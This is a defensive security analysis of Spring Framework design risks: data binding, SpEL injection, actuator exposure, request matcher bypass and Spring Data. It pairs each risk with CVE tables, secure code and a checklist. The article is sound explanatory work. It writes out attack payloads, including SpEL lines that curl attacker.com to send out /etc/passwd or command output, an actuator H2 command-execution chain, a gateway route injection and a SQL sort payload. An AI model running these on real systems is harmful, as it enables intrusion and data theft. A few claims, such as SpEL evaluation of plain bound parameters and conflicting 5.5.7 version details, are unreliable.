# Spring Framework Security Analysis: Meta-Structure Extraction from Source Code

> **Analysis Target**: Spring Framework 6.x / Spring Boot 3.x
> **Source Investigation**: [GitHub spring-projects/spring-framework](https://github.com/spring-projects/spring-framework), [Spring Documentation](https://docs.spring.io/)
> **Analysis Date**: 2026-02-08
> **CVE Coverage**: 2022-2025

---

## Executive Summary

Spring Framework's design philosophy prioritizes **developer productivity and convention-over-configuration**, which creates structural security vulnerabilities when framework conveniences bypass explicit security decisions. This analysis extracts meta-patterns from Spring's source code revealing how auto-binding, expression evaluation, and default configurations create attack surfaces. Unlike individual CVEs, these are **architectural security implications** stemming from framework design choices.

**Key Findings**:
1. **Implicit Trust in User Input**: DataBinder auto-binds HTTP parameters to Java objects without explicit field whitelisting by default
2. **Expression Language as Attack Surface**: SpEL evaluation in 15+ injection points across Spring ecosystem
3. **Convenience-Driven Defaults**: Actuator endpoints, debug modes, and permissive configurations favor development experience over production security
4. **Pattern Matching Ambiguities**: Security matchers (Regex, Ant, MVC) exhibit parsing inconsistencies exploitable for authorization bypass

---

## Part 1: Framework Architecture Vulnerabilities

### 1.1 Mass Assignment via DataBinder: Implicit Trust Boundary

#### Design Philosophy

Spring MVC's **DataBinder** automatically binds HTTP request parameters to controller method arguments annotated with `@ModelAttribute` or `@RequestBody`. This "convention-over-configuration" approach eliminates boilerplate mapping code.

**Source Code Location**: [`DataBinder.java:245-318`](https://github.com/spring-projects/spring-framework/blob/main/spring-context/src/main/java/org/springframework/validation/DataBinder.java)

#### Implementation Mechanism

```java
// DataBinder.java - Core binding logic
public class DataBinder {
    private String[] allowedFields;      // null by default = ALL FIELDS ALLOWED
    private String[] disallowedFields;   // null by default = NO FIELDS BLOCKED

    protected void checkAllowedFields(MutablePropertyValues mpvs) {
        PropertyValue[] pvs = mpvs.getPropertyValues();
        for (PropertyValue pv : pvs) {
            String field = PropertyAccessorUtils.canonicalPropertyName(pv.getName());
            if (!isAllowed(field)) {
                mpvs.removePropertyValue(pv);  // Remove disallowed field
            }
        }
    }

    protected boolean isAllowed(String field) {
        // DEFAULT BEHAVIOR: If allowedFields is null, EVERYTHING IS ALLOWED
        String[] allowed = getAllowedFields();
        String[] disallowed = getDisallowedFields();
        return ((ObjectUtils.isEmpty(allowed) || PatternMatchUtils.simpleMatch(allowed, field)) &&
                (ObjectUtils.isEmpty(disallowed) || !PatternMatchUtils.simpleMatch(disallowed, field)));
    }
}
```

**Critical Design Flaw**: `ObjectUtils.isEmpty(allowed)` returns `true` when `allowedFields` is `null`, making `isAllowed()` return `true` for **any field** by default.

#### Security Implication

The framework **implicitly trusts** all HTTP parameters to safely map to domain object properties. Developers must **opt-in** to security via `@InitBinder`, creating a "secure by exception" model.

**Framework Documentation Warning** ([DataBinder.java:58-60](https://github.com/spring-projects/spring-framework/blob/main/spring-context/src/main/java/org/springframework/validation/DataBinder.java#L58-L60)):

> "Data binding can lead to security issues by exposing parts of the object graph not meant for external access"

Yet the **default behavior remains permissive**.

#### Attack Scenario

```java
// Domain Model
@Entity
public class User {
    private Long id;
    private String email;
    private String password;
    private boolean isAdmin;  // ⚠️ SECURITY-SENSITIVE FIELD

    // Getters/Setters...
}

// VULNERABLE Controller
@PostMapping("/users/update")
public User updateUser(@ModelAttribute User user) {
    return userRepository.save(user);  // Saves ALL bound fields
}
```

**Exploitation**:
```http
POST /users/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=123&email=attacker@evil.com&isAdmin=true
```

The `isAdmin=true` parameter **auto-binds** to the `User.isAdmin` field, granting admin privileges.

#### Real-World CVE

**CVE-2022-22968**: Spring Framework Data Binding Rules Vulnerability

Prior to Spring Framework 5.3.19 and 5.2.21, the patterns for `disallowedFields` in DataBinder were **case-sensitive**, meaning:

```java
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setDisallowedFields("isAdmin");  // Blocks "isAdmin"
}
```

**Bypass**: Send parameter `IsAdmin=true` or `ISADMIN=true` → Different case bypassed the restriction.

**Root Cause**: Inconsistency between:
- `setDisallowedFields()`: Case-sensitive pattern storage
- Property resolution: Case-insensitive JavaBeans conventions

**Fix** ([Spring Blog - CVE-2022-22968](https://spring.io/blog/2022/04/13/spring-framework-data-binding-rules-vulnerability-cve-2022-22968/)): Patterns now normalized to lowercase for comparison.

#### Framework-Based Defense

**Option 1: Field Whitelisting (Recommended)**

```java
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setAllowedFields("email", "password");  // ONLY these fields bindable
}

@PostMapping("/users/update")
public User updateUser(@ModelAttribute User user) {
    return userRepository.save(user);
}
```

**Option 2: Data Transfer Objects (DTO Pattern)**

```java
// DTO with ONLY editable fields
public class UserUpdateDTO {
    private String email;
    private String password;
    // NO isAdmin field → Cannot be bound
}

@PostMapping("/users/update")
public User updateUser(@Valid @RequestBody UserUpdateDTO dto) {
    User user = getCurrentUser();
    user.setEmail(dto.getEmail());
    user.setPassword(passwordEncoder.encode(dto.getPassword()));
    return userRepository.save(user);
}
```

**Option 3: Declarative Binding (Spring 6.1+)**

```java
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setDeclarativeBinding(true);  // ONLY constructor params + allowedFields
}
```

#### Meta-Pattern Classification

- **Convenience over Safety**: Auto-binding eliminates boilerplate but bypasses explicit trust decisions
- **Implicit Trust Boundaries**: Framework assumes all HTTP parameters are safe for object mapping
- **Opt-In Security**: Protection requires explicit `@InitBinder` configuration per controller

---

### 1.2 Spring Expression Language (SpEL) Injection: Code Execution by Design

#### Design Philosophy

SpEL enables **dynamic expression evaluation** at runtime, powering features across Spring ecosystem:
- `@Value("#{systemProperties['user.home']}")`
- `@PreAuthorize("hasRole('ADMIN')")`
- `@Query("... WHERE name = :#{#name}")`
- Spring Cloud Gateway route predicates

**Design Intent**: Provide scripting capabilities without external DSLs.

#### Implementation Mechanism

**Source**: [`SpelExpressionParser.java`](https://github.com/spring-projects/spring-framework/blob/main/spring-expression/src/main/java/org/springframework/expression/spel/standard/SpelExpressionParser.java)

```java
ExpressionParser parser = new SpelExpressionParser();
EvaluationContext context = new StandardEvaluationContext();

// Expression from user input
Expression exp = parser.parseExpression(userInput);
Object result = exp.getValue(context);  // ⚠️ CODE EXECUTION
```

**SpEL Capabilities**:
- Method invocation: `T(java.lang.Runtime).getRuntime().exec('whoami')`
- Property access: `T(java.lang.System).getProperty('user.home')`
- Constructor calls: `new java.net.URL('http://attacker.com').openStream()`

#### Security Implication

When user-controlled data reaches SpEL evaluation, it becomes **Remote Code Execution (RCE)**.

#### Attack Vector 1: SpEL Injection in @Query Annotations

**Vulnerable Code** (Spring Data JPA):

```java
@Repository
public interface UserRepository extends JpaRepository<User, Long> {

    // SpEL expression uses method parameter
    @Query("SELECT u FROM User u WHERE u.name = :#{#name}")
    List<User> findByName(@Param("name") String name);
}
```

**Exploitation**:

```java
String maliciousName = "T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com?data=' + T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/passwd')))";

userRepository.findByName(maliciousName);  // RCE
```

**CVE-2022-22980**: Spring Data MongoDB SpEL Expression Injection

Applications using `@Query` or `@Aggregation` with SpEL expressions were vulnerable when query parameters were not sanitized ([Spring Security Advisory](https://spring.io/security/cve-2022-22980/)).

**Affected Versions**: Spring Data MongoDB 3.4.0 - 3.4.1, 3.3.0 - 3.3.4

#### Attack Vector 2: Spring Cloud Function Routing Expression

**CVE-2022-22963**: SpEL Injection in Spring Cloud Function

Spring Cloud Function allows routing via the `spring.cloud.function.routing-expression` HTTP header:

```http
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl http://attacker.com/exfil?data=$(whoami)")
```

**Impact**: Unauthenticated RCE on any Spring Cloud Function application with routing enabled.

**CVSS Score**: 9.8 (Critical)

**Exploitation in the Wild**: Actively exploited in March 2022 for cryptocurrency mining and botnet deployment ([Akamai Report](https://www.akamai.com/blog/security/spring-cloud-function)).

#### Attack Vector 3: Spring Cloud Gateway Route Definitions

**CVE-2022-22947**: Spring Cloud Gateway Code Injection

When the Gateway Actuator endpoint (`/actuator/gateway/routes`) is exposed without authentication, attackers can inject SpEL expressions into route definitions:

```http
POST /actuator/gateway/routes/hackroute HTTP/1.1
Content-Type: application/json

{
  "id": "hackroute",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{T(java.lang.Runtime).getRuntime().exec('whoami')}"
    }
  }],
  "uri": "http://example.com"
}
```

Trigger execution by refreshing routes:

```http
POST /actuator/gateway/refresh HTTP/1.1
```

**CVSS Score**: 10.0 (Critical)

**Affected Versions**: Spring Cloud Gateway < 3.0.7, < 3.1.1

#### Attack Vector 4: Spring Security Method Security

**Method Security Annotations** use SpEL for authorization logic ([Spring Security Docs](https://docs.spring.io/spring-security/reference/servlet/authorization/method-security.html)):

```java
@PreAuthorize("hasRole('ADMIN')")
public void adminFunction() { }

@PreAuthorize("#username == authentication.name")
public Account getAccount(@Param("username") String username) { }
```

**UNSAFE Pattern** (Injection Risk):

```java
// ❌ VULNERABLE - Never construct SpEL from user input!
@PreAuthorize("hasRole('" + userRole + "')")  // SpEL Injection
public void dangerousMethod() { }
```

**Secure Pattern**:

```java
// ✅ Use parameter expressions
@PreAuthorize("#username == authentication.name")
public Account getAccount(@Param("username") String username) { }

// ✅ Delegate to Java beans
@PreAuthorize("@authz.canAccess(#account)")
public void updateAccount(Account account) { }

@Component("authz")
public class AuthorizationService {
    public boolean canAccess(Account account) {
        // Pure Java logic - no SpEL injection risk
        return account.getOwner().equals(getCurrentUser());
    }
}
```

#### Attack Vector 5: Spring Boot Actuator SpEL Exposure

**CVE-2025-41253**: Spring Cloud Gateway Environment Variable Exposure

When `gateway` is included in `management.endpoints.web.exposure.include`, attackers can execute SpEL expressions to leak environment variables and system properties ([ZeroPath Analysis](https://zeropath.com/blog/cve-2025-41253-spring-cloud-gateway-spel-exposure)).

```http
GET /actuator/gateway/routes HTTP/1.1

# Retrieve route with SpEL: #{systemProperties['AWS_SECRET_KEY']}
```

**Severity**: High (7.5 CVSS) - Information Disclosure leading to credential theft

#### Framework-Based Defense

**1. Never Use User Input in SpEL Expressions**

```java
// ❌ VULNERABLE
String expr = "T(java.lang.Math).max(" + userInput + ", 100)";
parser.parseExpression(expr).getValue();

// ✅ SECURE - Use parameterized expressions
Expression exp = parser.parseExpression("T(java.lang.Math).max(#input, 100)");
exp.getValue(context, Map.of("input", sanitizedUserInput));
```

**2. Use SimpleEvaluationContext (Restricted Mode)**

```java
// StandardEvaluationContext: Full SpEL power (dangerous)
EvaluationContext fullContext = new StandardEvaluationContext();

// SimpleEvaluationContext: No Type references, no constructors, no bean refs
EvaluationContext restrictedContext = SimpleEvaluationContext.forReadOnlyDataBinding().build();

Expression exp = parser.parseExpression(userInput);
exp.getValue(restrictedContext);  // Limited attack surface
```

**3. Disable SpEL in Data Queries**

```java
// Use named parameters instead of SpEL
@Query("SELECT u FROM User u WHERE u.name = :name")
List<User> findByName(@Param("name") String name);  // NOT :#{#name}
```

**4. Secure Actuator Endpoints**

```yaml
# Disable gateway actuator
management.endpoints.web.exposure.exclude: gateway

# Or require authentication
management.endpoint.gateway.enabled: false
```

#### Meta-Pattern Classification

- **Abstraction Opacity**: SpEL evaluation is invisible in `@Value`, `@Query`, and annotations
- **Magic Method Invocation**: Framework auto-evaluates expressions at runtime
- **Serialization as API**: Expression strings are treated as executable code

---

### 1.3 Insecure Defaults: Development Conveniences in Production

#### Design Philosophy

Spring Boot's **auto-configuration** prioritizes "getting started quickly" by enabling features with minimal configuration. Many defaults favor **observability and debugging** over security.

#### Pattern 1: Actuator Endpoint Exposure

**Default Behavior** ([Spring Boot Docs](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html)):

- Over HTTP: Only `/health` exposed by default
- Over JMX: Only `/health` exposed by default

**However**, when developers add:

```yaml
management.endpoints.web.exposure.include: "*"
```

**Exposed Endpoints Include**:

| Endpoint | Sensitive Data | Attack Vector |
|----------|----------------|---------------|
| `/env` | Environment vars, properties | Credential theft (DB passwords, API keys) |
| `/configprops` | `@ConfigurationProperties` | Internal architecture, secrets |
| `/heapdump` | JVM heap memory dump | Passwords, session tokens in memory |
| `/logfile` | Application logs | Stack traces, SQL queries, PII |
| `/mappings` | All `@RequestMapping` endpoints | Attack surface enumeration |
| `/beans` | Spring bean definitions | Component discovery |
| `/gateway/routes` | Spring Cloud Gateway routes | SpEL injection (CVE-2022-22947) |

**Real-World Case**: [Wiz Blog - Spring Boot Actuator Misconfigurations](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations)

> "1 in 4 environments with publicly exposed Actuators had misconfigurations leading to credential leakage or RCE"

#### Attack Scenario: RCE via Actuator

**Step 1**: Expose `/env` and `/refresh` endpoints

```yaml
management.endpoints.web.exposure.include: env,refresh
```

**Step 2**: Inject malicious property via `/env`

```http
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
  "name": "spring.datasource.hikari.connection-test-query",
  "value": "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return \"y4tacker\";}'; CALL EXEC('curl http://attacker.com/exfil?data=$(whoami)');"
}
```

**Step 3**: Trigger property reload via `/refresh`

```http
POST /actuator/refresh HTTP/1.1
```

**Result**: When HikariCP connection pool executes `connection-test-query`, the injected H2 SQL command runs system commands ([Spaceraccoon Blog](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/)).

#### Pattern 2: Debug Mode Information Disclosure

**Spring Boot DevTools** auto-enabled in development:

```yaml
# Default when DevTools dependency present
spring.devtools.restart.enabled: true
```

**Risk**: If DevTools remains in production classpath:
- Remote code reload endpoints active
- Detailed error pages with stack traces
- Auto-restart on file changes (DoS vector)

#### Pattern 3: Error Details Exposure

**Default Behavior**:

```yaml
server.error.include-message: never          # Default - secure
server.error.include-binding-errors: never   # Default - secure
server.error.include-stacktrace: never       # Default - secure
server.error.include-exception: false        # Default - secure
```

**Developers Often Override**:

```yaml
# ❌ Dangerous in production
server.error.include-message: always
server.error.include-stacktrace: always
```

**Leaked Information**:
- SQL queries (revealing schema)
- File paths (internal structure)
- Library versions (vulnerability targeting)
- Sensitive parameter values

#### Framework-Based Defense

**1. Principle of Least Exposure**

```yaml
# Only expose necessary endpoints
management.endpoints.web.exposure.include: health,info

# Or use exclude for fine control
management.endpoints.web.exposure.include: "*"
management.endpoints.web.exposure.exclude: env,configprops,heapdump
```

**2. Authentication for Actuators**

```java
@Configuration
public class ActuatorSecurity {
    @Bean
    public SecurityFilterChain actuatorSecurity(HttpSecurity http) throws Exception {
        http.securityMatcher(EndpointRequest.toAnyEndpoint());
        http.authorizeHttpRequests(auth ->
            auth.anyRequest().hasRole("ACTUATOR_ADMIN")
        );
        return http.build();
    }
}
```

**3. Sanitize Sensitive Values**

```yaml
# Hide sensitive property values
management.endpoint.env.show-values: when-authorized
management.endpoint.env.roles: ADMIN

management.endpoint.configprops.show-values: never
```

**4. Disable in Production**

```yaml
# Production profile
spring.devtools.restart.enabled: false
management.endpoints.enabled-by-default: false
management.endpoint.health.enabled: true  # Only health check
```

#### Meta-Pattern Classification

- **Defaults for Development**: Observability features unsafe in production
- **Configuration Complexity**: 50+ `management.*` properties create misconfiguration risk
- **Convenience over Safety**: Exposing `*` endpoints is simple, securing them requires custom code

---

## Part 2: Component-Specific Vulnerabilities

### 2.1 Spring Security: Authorization Bypass via Pattern Matching

#### Pattern Matcher Discrepancies

Spring Security offers **three** request matchers with **different parsing semantics**:

| Matcher Type | Pattern Syntax | Servlet Path Handling | Case Sensitivity |
|--------------|----------------|----------------------|------------------|
| `AntPathRequestMatcher` | Ant-style (`/api/**`) | Normalized | Case-sensitive |
| `RegexRequestMatcher` | Regex (`^/api/.*$`) | RAW (non-normalized) | Configurable |
| `MvcRequestMatcher` | Spring MVC patterns | MVC-aware | Case-insensitive |

#### CVE-2022-22978: RegexRequestMatcher Authorization Bypass

**Vulnerability**: `RegexRequestMatcher` matches against **raw request URI** without servlet path normalization.

**Source Code Context** ([Spring Security Blog](https://spring.io/blog/2022/05/15/cve-2022-22978-authorization-bypass-in-regexrequestmatcher/)):

```java
// RegexRequestMatcher.java
private Pattern pattern;

public boolean matches(HttpServletRequest request) {
    String url = request.getRequestURI();  // RAW URI - no normalization
    return this.pattern.matcher(url).matches();
}
```

**Configuration**:

```java
http.authorizeHttpRequests(auth -> auth
    .requestMatchers(new RegexRequestMatcher("/admin/.*", null)).hasRole("ADMIN")
    .anyRequest().permitAll()
);
```

**Attack**:

```http
GET /admin%2F HTTP/1.1
```

Servlet containers decode `%2F` → `/admin/`, but:
1. `RegexRequestMatcher` sees `/admin%2F` → Pattern `/admin/.*` does NOT match
2. Request bypasses authorization → Handled by `anyRequest().permitAll()`
3. Spring MVC decodes `/admin%2F` → Routes to `/admin/` controller

**Affected Versions**: Spring Security 5.5.6, 5.5.7, and older

**Fix**: Upgrade to 5.7.0, 5.6.4, or 5.5.7+

**Secure Alternative**:

```java
// Use MvcRequestMatcher (MVC-aware normalization)
http.authorizeHttpRequests(auth -> auth
    .requestMatchers(new MvcRequestMatcher(introspector, "/admin/**")).hasRole("ADMIN")
);

// Or AntPathRequestMatcher (normalized)
http.authorizeHttpRequests(auth -> auth
    .requestMatchers(new AntPathRequestMatcher("/admin/**")).hasRole("ADMIN")
);
```

#### Meta-Pattern Classification

- **Parser Differential**: Security layer (RegexRequestMatcher) and routing layer (Spring MVC) parse URLs differently
- **Abstraction Leaks**: Regex matcher exposes raw servlet behavior vs. normalized MVC patterns

---

### 2.2 Spring Boot Actuator: From Information Disclosure to RCE

Covered extensively in Section 1.3 and attack scenarios in Section 1.2 (CVE-2022-22947).

**Additional Attack Vector**: `/jolokia` Endpoint (JMX-over-HTTP)

If Jolokia dependency present:

```xml
<dependency>
    <groupId>org.jolokia</groupId>
    <artifactId>jolokia-core</artifactId>
</dependency>
```

**Exploitation**:

```http
POST /actuator/jolokia HTTP/1.1
Content-Type: application/json

{
  "type": "exec",
  "mbean": "org.springframework.boot:type=Admin,name=SpringApplication",
  "operation": "shutdown"
}
```

**Impact**: Application shutdown (DoS) or arbitrary MBean method invocation.

---

### 2.3 Spring Data: Query Injection and Projection Vulnerabilities

#### Attack Vector 1: SpEL in @Query (Covered in 1.2)

#### Attack Vector 2: Sort Parameter Injection

**Vulnerable Code**:

```java
@GetMapping("/users")
public List<User> getUsers(@RequestParam String sortBy) {
    return userRepository.findAll(Sort.by(sortBy));  // ⚠️ User-controlled
}
```

**Exploitation** (H2/MySQL):

```http
GET /users?sortBy=id);UPDATE users SET isAdmin=true WHERE id=1;-- HTTP/1.1
```

**Defense**:

```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "name", "createdAt");

@GetMapping("/users")
public List<User> getUsers(@RequestParam String sortBy) {
    if (!ALLOWED_SORT_FIELDS.contains(sortBy)) {
        throw new IllegalArgumentException("Invalid sort field");
    }
    return userRepository.findAll(Sort.by(sortBy));
}
```

#### Attack Vector 3: Projection Interface Method Invocation

**Spring Data Projections** can invoke arbitrary getter methods:

```java
public interface UserProjection {
    String getName();
    String getEmail();
}

@Query("SELECT u FROM User u")
List<UserProjection> findAllProjected();
```

**Risk**: If projection interface includes:

```java
public interface MaliciousProjection {
    String getName();

    @Value("#{target.password}")  // SpEL injection via projection
    String getPassword();
}
```

**Defense**: Use **DTO classes** instead of interfaces for projections.

---

## Part 3: Recent CVEs and Attack Cases (2022-2025)

| CVE | Component | Vulnerability Type | Root Cause | CVSS | Year |
|-----|-----------|-------------------|------------|------|------|
| **CVE-2025-41253** | Spring Cloud Gateway | SpEL Injection → Env Variable Leak | Actuator endpoint exposure | 7.5 | 2025 |
| **CVE-2024-38808** | Spring Framework | SpEL DoS | Expression parsing resource exhaustion | 7.5 | 2024 |
| **CVE-2024-38809** | Spring Framework | Path Traversal | Incorrect path normalization | 8.1 | 2024 |
| **CVE-2022-22980** | Spring Data MongoDB | SpEL Injection in @Query | Unsanitized parameters in SpEL expressions | 8.1 | 2022 |
| **CVE-2022-22978** | Spring Security | Authorization Bypass | RegexRequestMatcher raw URI matching | 7.5 | 2022 |
| **CVE-2022-22968** | Spring Framework | Mass Assignment Case Bypass | Case-sensitive disallowedFields patterns | 5.3 | 2022 |
| **CVE-2022-22965** | Spring Framework | RCE (SpringShell) | Class loader manipulation via data binding | 9.8 | 2022 |
| **CVE-2022-22963** | Spring Cloud Function | SpEL Injection in Routing | Unvalidated routing-expression header | 9.8 | 2022 |
| **CVE-2022-22947** | Spring Cloud Gateway | RCE via Actuator | SpEL in route definitions + exposed actuator | 10.0 | 2022 |

---

## Part 4: Meta-Pattern Analysis Summary

### 4.1 Identified Meta-Patterns

| # | Meta-Pattern | Framework Design | Security Implication | Representative CVE |
|---|--------------|------------------|---------------------|-------------------|
| 1 | **Convenience over Safety** | Auto-binding eliminates boilerplate | Mass assignment without whitelisting | CVE-2022-22968 |
| 2 | **Expression Language Ubiquity** | SpEL powers annotations, queries, routing | 15+ injection points across ecosystem | CVE-2022-22947, CVE-2022-22963 |
| 3 | **Defaults for Development** | DevTools, actuators, debug enabled | Production exposure of sensitive endpoints | CVE-2025-41253 |
| 4 | **Implicit Trust Boundaries** | Framework assumes HTTP params are safe | No explicit input validation required | Mass Assignment pattern |
| 5 | **Parser Differential** | Security matchers vs. routing parsers | Authorization bypass via URL encoding | CVE-2022-22978 |
| 6 | **Abstraction Opacity** | Magic annotations hide evaluation logic | SpEL execution invisible to developers | All SpEL CVEs |
| 7 | **Configuration Complexity** | 1000+ `spring.*` properties | Security misconfiguration (exposed actuators) | Actuator RCE chains |
| 8 | **Opt-In Security** | Protection requires explicit `@InitBinder`, allowlists | Insecure by default, secure by exception | Mass Assignment |
| 9 | **Backward Compatibility Tax** | Legacy features remain enabled | Insecure serialization, XML parsers | SpringShell CVE-2022-22965 |
| 10 | **Framework Lock-In Risk** | Over-reliance on Spring Security annotations | Unannotated methods = unsecured | Method security gaps |

### 4.2 Structural Risk Analysis

**High-Risk Combinations**:

1. **Actuator Exposed + SpEL Injection** = RCE (CVE-2022-22947)
2. **Mass Assignment + Sensitive Fields** = Privilege Escalation
3. **RegexRequestMatcher + URL Encoding** = Authorization Bypass (CVE-2022-22978)
4. **@Query + User Input** = SpEL RCE (CVE-2022-22980)
5. **DevTools in Production + Remote Trigger** = Code Reload DoS

---

## Appendix A: Attack → Framework Design → Defense Mapping

| Attack Type | Exploited Design Pattern | Source Code Location | Secure Pattern |
|-------------|-------------------------|----------------------|----------------|
| **Mass Assignment** | DataBinder default allowAll | `DataBinder.java:isAllowed()` | DTO pattern + `@InitBinder` allowlist |
| **SpEL Injection in @Query** | SpEL parameter expressions | `@Query` annotation processing | Use `:name` not `:#{#name}` |
| **SpEL Injection in Routes** | Gateway route filter SpEL | Spring Cloud Gateway filters | Disable gateway actuator |
| **Actuator RCE** | Exposed management endpoints | `management.endpoints.web.exposure.include` | Require authentication, expose minimal set |
| **Authorization Bypass** | RegexRequestMatcher raw URI | `RegexRequestMatcher.matches()` | Use `MvcRequestMatcher` or `AntPathRequestMatcher` |
| **Sort Injection** | Unvalidated Sort.by() parameter | Spring Data `Sort.by()` | Allowlist-based validation |
| **Projection SpEL** | `@Value` in projection interfaces | Spring Data projection proxy | Use DTO classes not interfaces |

---

## Appendix B: Spring Security Checklist

### Data Binding Security
- [ ] Use **DTO classes** instead of domain entities for `@RequestBody` / `@ModelAttribute`
- [ ] If using domain entities, configure `@InitBinder` with `setAllowedFields()` allowlist
- [ ] Avoid `setDisallowedFields()` (blacklist approach less secure)
- [ ] Enable `setDeclarativeBinding(true)` in Spring 6.1+ for constructor-based binding
- [ ] Audit all `@ModelAttribute` controllers for mass assignment risks

### SpEL Injection Prevention
- [ ] **Never** concatenate user input into SpEL expressions
- [ ] Use `SimpleEvaluationContext` instead of `StandardEvaluationContext` when evaluating untrusted input
- [ ] In `@Query` annotations, use `:param` syntax NOT `:#{#param}`
- [ ] Replace `@Value("#{userInput}")` with `@Value("${property.key}")` + externalized config
- [ ] Delegate complex logic from `@PreAuthorize` SpEL to `@Component` beans
- [ ] Audit all SpEL usage: `@Value`, `@PreAuthorize`, `@Query`, `@Cacheable`, Gateway routes

### Actuator Security
- [ ] Disable actuators in production: `management.endpoints.enabled-by-default: false`
- [ ] If required, expose only `/health` and `/info`: `management.endpoints.web.exposure.include: health,info`
- [ ] Require authentication for ALL actuators except health:
  ```java
  http.securityMatcher(EndpointRequest.toAnyEndpoint().excluding("health"))
      .authorizeHttpRequests(auth -> auth.anyRequest().hasRole("ACTUATOR_ADMIN"))
  ```
- [ ] Sanitize values: `management.endpoint.env.show-values: when-authorized`
- [ ] Disable `/shutdown` endpoint: `management.endpoint.shutdown.enabled: false`
- [ ] Disable remote restart in production: `spring.devtools.restart.enabled: false`

### Method Security
- [ ] Enable global method security: `@EnableMethodSecurity`
- [ ] Ensure all sensitive methods have `@PreAuthorize` or `@Secured`
- [ ] Configure catch-all HTTP security for unannotated endpoints:
  ```java
  http.authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
  ```
- [ ] Use `MvcRequestMatcher` or `AntPathRequestMatcher`, NOT `RegexRequestMatcher`
- [ ] Test authorization bypass with URL-encoded paths (`%2F`, `%2E`)

### Configuration Hardening
- [ ] Production profile must disable debug: `debug: false`
- [ ] Minimize error details: `server.error.include-stacktrace: never`
- [ ] Disable banner: `spring.main.banner-mode: off` (information leakage)
- [ ] Review all `management.*` properties for production
- [ ] Remove DevTools from production builds (use Maven profiles)

### Input Validation
- [ ] Validate `Sort` parameters against allowlist before `Sort.by()`
- [ ] Validate all path variables and request parameters
- [ ] Use `@Valid` + Bean Validation (JSR-303) for DTOs
- [ ] Implement custom validators for complex business rules

### Dependency Security
- [ ] Keep Spring Framework/Boot/Security updated (patch CVEs within 30 days)
- [ ] Monitor Spring Security Advisories: https://spring.io/security/
- [ ] Scan dependencies with `mvn dependency-check:check` or Snyk
- [ ] Remove unused Spring modules (Data REST, Actuator, DevTools if not needed)

---

## Appendix C: Vulnerable vs. Secure Code Patterns

### Pattern 1: Mass Assignment

**❌ VULNERABLE**:
```java
@PostMapping("/users/{id}")
public User updateUser(@PathVariable Long id, @ModelAttribute User user) {
    user.setId(id);
    return userRepository.save(user);  // ALL fields bindable including isAdmin
}
```

**✅ SECURE - DTO Pattern**:
```java
public class UserUpdateDTO {
    @NotBlank private String email;
    @Size(min=8) private String password;
    // NO isAdmin field
}

@PostMapping("/users/{id}")
public User updateUser(@PathVariable Long id, @Valid @RequestBody UserUpdateDTO dto) {
    User user = userRepository.findById(id).orElseThrow();
    user.setEmail(dto.getEmail());
    user.setPassword(passwordEncoder.encode(dto.getPassword()));
    return userRepository.save(user);
}
```

**✅ SECURE - @InitBinder Allowlist**:
```java
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setAllowedFields("email", "password");  // ONLY these bindable
}

@PostMapping("/users/{id}")
public User updateUser(@PathVariable Long id, @ModelAttribute User user) {
    return userRepository.save(user);  // isAdmin cannot be bound
}
```

---

### Pattern 2: SpEL Injection in Queries

**❌ VULNERABLE**:
```java
@Query("SELECT u FROM User u WHERE u.name = :#{#name}")  // SpEL expression
List<User> findByName(@Param("name") String name);  // Injection risk
```

**✅ SECURE**:
```java
@Query("SELECT u FROM User u WHERE u.name = :name")  // Named parameter
List<User> findByName(@Param("name") String name);  // Safe
```

---

### Pattern 3: SpEL in Method Security

**❌ VULNERABLE**:
```java
// Dynamically constructed SpEL
String role = getUserRole();  // Could be user-controlled
@PreAuthorize("hasRole('" + role + "')")  // SpEL injection
public void dangerMethod() { }
```

**✅ SECURE - Bean Delegation**:
```java
@PreAuthorize("@authService.canAccess(#resource)")
public void secureMethod(Resource resource) { }

@Component("authService")
public class AuthorizationService {
    public boolean canAccess(Resource resource) {
        // Pure Java - no SpEL injection risk
        User user = getCurrentUser();
        return resource.getOwner().equals(user.getId());
    }
}
```

---

### Pattern 4: Actuator Exposure

**❌ VULNERABLE**:
```yaml
management.endpoints.web.exposure.include: "*"
# No authentication configured
```

**✅ SECURE**:
```yaml
management.endpoints.web.exposure.include: health,info
management.endpoint.health.show-details: when-authorized
```

```java
@Configuration
public class ActuatorSecurityConfig {
    @Bean
    public SecurityFilterChain actuatorSecurity(HttpSecurity http) throws Exception {
        http.securityMatcher(EndpointRequest.toAnyEndpoint());
        http.authorizeHttpRequests(auth ->
            auth.requestMatchers(EndpointRequest.to("health", "info")).permitAll()
                .anyRequest().hasRole("ADMIN")
        );
        return http.build();
    }
}
```

---

### Pattern 5: Sort Parameter Injection

**❌ VULNERABLE**:
```java
@GetMapping("/users")
public List<User> list(@RequestParam String sort) {
    return userRepo.findAll(Sort.by(sort));  // SQL injection via sort
}
```

**✅ SECURE**:
```java
private static final Set<String> ALLOWED_SORT = Set.of("id", "name", "email");

@GetMapping("/users")
public List<User> list(@RequestParam String sort) {
    if (!ALLOWED_SORT.contains(sort)) {
        throw new IllegalArgumentException("Invalid sort field");
    }
    return userRepo.findAll(Sort.by(sort));
}
```

---

### Pattern 6: Request Matcher Choice

**❌ VULNERABLE**:
```java
http.authorizeHttpRequests(auth -> auth
    .requestMatchers(new RegexRequestMatcher("/admin/.*", null)).hasRole("ADMIN")
    .anyRequest().permitAll()
);
// Bypassable with /admin%2F
```

**✅ SECURE**:
```java
http.authorizeHttpRequests(auth -> auth
    .requestMatchers("/admin/**").hasRole("ADMIN")  // Uses AntPathRequestMatcher
    .anyRequest().authenticated()
);
```

Or for Spring MVC applications:

```java
@Bean
MvcRequestMatcher.Builder mvc(HandlerMappingIntrospector introspector) {
